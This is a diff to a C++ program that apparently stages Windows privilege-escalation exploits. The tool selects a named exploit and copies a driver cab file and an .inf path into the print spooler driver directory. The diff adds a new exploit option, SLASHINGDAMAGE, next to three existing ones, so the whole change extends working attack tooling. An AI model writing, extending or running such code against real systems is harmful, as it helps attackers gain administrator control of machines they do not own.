@@ -8,7 +8,7 @@
 
 namespace
 {
-	const std::set<std::string> s_exploits = { "RADIANTDAMAGE", "POISONDAMAGE", "ACIDDAMAGE" };
+	const std::set<std::string> s_exploits = { "RADIANTDAMAGE", "POISONDAMAGE", "ACIDDAMAGE", "SLASHINGDAMAGE" };
 
 	bool parseCLI(int p_argc, const char* p_argv[], std::string& p_exploit)
 	{
@@ -84,6 +84,13 @@ int main(int p_argc, const char* p_argv[])
 		std::filesystem::create_directory("C:\\LMUD1o40\\");
 		inf_path.assign("C:\\LMUD1o40\\LMUD1o40.inf");
 		std::filesystem::copy("cab_files\\ACIDDAMAGE\\LMUD1o40.cab", "C:\\Windows\\System32\\spool\\drivers\\x64\\PCC\\", std::filesystem::copy_options::update_existing);
+	}
+	else if (exploit == "SLASHINGDAMAGE")
+	{
+		std::cout << "[+] Staging SLASHINGDAMAGE files" << std::endl;
+		std::filesystem::create_directory("C:\\slashing_damage\\");
+		inf_path.assign("C:\\slashing_damage\\slashing_damage.inf");
+		std::filesystem::copy("cab_files\\SLASHINGDAMAGE\\slashing_damage.cab", "C:\\Windows\\System32\\spool\\drivers\\x64\\PCC\\");
 	}
 	else
 	{
